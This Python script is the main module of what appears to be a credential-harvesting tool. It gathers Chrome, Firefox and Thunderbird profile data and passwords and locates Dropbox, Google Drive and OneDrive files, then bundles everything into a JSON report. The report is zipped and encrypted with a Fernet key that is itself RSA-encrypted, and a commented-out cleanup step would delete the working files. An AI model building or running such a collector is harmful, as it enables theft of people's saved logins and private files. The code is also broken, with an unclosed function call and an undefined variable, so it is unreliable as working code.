#!/usr/bin/python


####
### Main script
##
#
##
###
####

import cloud, browserfile, config, packetizer, crypto, logger, getpass
import os, subprocess, time, json, zipfile, sys, base64
from cryptography.fernet import Fernet

def init(reportPathUser):
	""" Initialize report """
	# report name and path
	reportName = crypto.md5(str(time.time()))
	
	if os.path.isdir(reportPathUser):
		reportPath = os.path.join(reportPathUser, reportName)	
	elif reportPathUser is None:
		reportPath = os.path.join(config.START_PATH, reportName)
	else:
		logger.log("Path " + reportPathUser + " is not a valid path")
		sys.exit(1)

	# create directory used for report files
	os.mkdir(reportPath)

	logger.log("Report name: " + reportName)
	logger.log("Path: " + reportPath)

	return (reportName, reportPath)

def browserFinder(reportPath):
	""" Run the finder for the browsers """

	# find passwords and browser files
	chromeReportFolder = os.path.join(reportPath, config.GCHROME_COPY_FOLDER)
	logger.log("Chrome Profile Folder: " + chromeReportFolder)
	os.mkdir(chromeReportFolder)
	chrome = browserfile.chromeFinder(chromeReportFolder)

	ffReportFolder = os.path.join(reportPath, config.FF_COPY_FOLDER)
	logger.log("Firefox Profile Folder: " + ffReportFolder)
	os.mkdir(ffReportFolder)
	ffList = browserfile.firefoxFinder(ffReportFolder)

	thReportFolder = os.path.join(reportPath, config.TH_COPY_FOLDER)
	logger.log("Thunderbird Profile Folder: " + thReportFolder)
	os.mkdir(thReportFolder)
	thList = browserfile.thunderbirdFinder(thReportFolder)

	browserPackList = [chrome, ffList, thList]
	return browserPackList

def cloudFinder():
	""" Run the finder for the cloud """
	
	# find cloud files
	cloudPackList = list()
	dropboxList = cloud.dropbox()
	cloudPackList.append(dropboxList)

	# gdrive and onedrive are not available for linux
	if config.OP_SYS == "Windows":
		gdriveList = cloud.gdrive()
		onedriveList = cloud.onedrive()

		cloudPackList.append(gdriveList)
		cloudPackList.append(onedriveList)

	return cloudPackList	

def zipper(encZipPath, reportName, reportPath, browserPackList, cloudPackList):
	""" Create the directories and the encrypted ZIP """
	
	#pack all together insto JSON
	jsontext = packetizer.mainPacker(browserPackList, cloudPackList)
	
	logger.log("\n === JSON Report === \n")
	logger.log(jsontext, "no")

	# save into a file
	os.chdir(reportPath)
	fileName = reportName + ".report"
	f = open(fileName,"w+")
	jsonReport = packetizer.mainPacker(browserPackList, cloudPackList)
	f.write(json.dumps(jsonReport, sort_keys=True, indent=4))
	f.close()
	logger.log("JSON report " + fileName + "  stored at " + os.getcwd())
	
	# create  ZIP 
	os.chdir(os.path.dirname(os.getcwd()))
	zipFileName = reportName + ".zip"
	zipFile = zipfile.ZipFile(zipFileName, "w")

	# walk the directory and add to ZIP
	for dirname, subdirs, files in os.walk(reportName):
		zipFile.write(dirname)

		for filename in files:
			zipFile.write(os.path.join(dirname, filename))
	
	zipFile.close()
	logger.log("ZIP file " + zipFileName + " created in " + os.getcwd())
		
	# now crypt the file
	zipEnc = os.path.join(encZipPath, zipFileName + ".enc")
	zipKey = Fernet.generate_key()
	logger.log("Encrypting " + os.path.join(encZipPath, zipFileName))
	zipBytesEnc = crypto.encryptFernetFile(os.path.join(encZipPath,zipFileName), zipKey)

	# encrypt the keys
	encKeyZip = crypto.encryptRSA(zipKey

	logger.log("Writing key info to " + zipEnc)
	hmacFile = open(zipEnc, "w+")
	hmacFile.write("\nenc:" + zipBytesEnc)
	hmacFile.write("\nk:" + encKeyZip)
	hmacFile.close()

	# delete the random key
	zipKey = None
	del zipKey

	hmacKey = None
	del hmacKey
	
	# uncomment for final version
	#os.rmdir(completeReportPath)
	logger.log("Deleting " + zipEnc + "(TODO for final version)")
	
def main():
	userPath = sys.argv[1]

	report = init(userPath)
	browserPackList = browserFinder(report[1])
	cloudPackList = cloudFinder()
	zipper(userPath, report[0], report[1], browserPackList, cloudPackList)
	

if __name__ == "__main__":
	main()
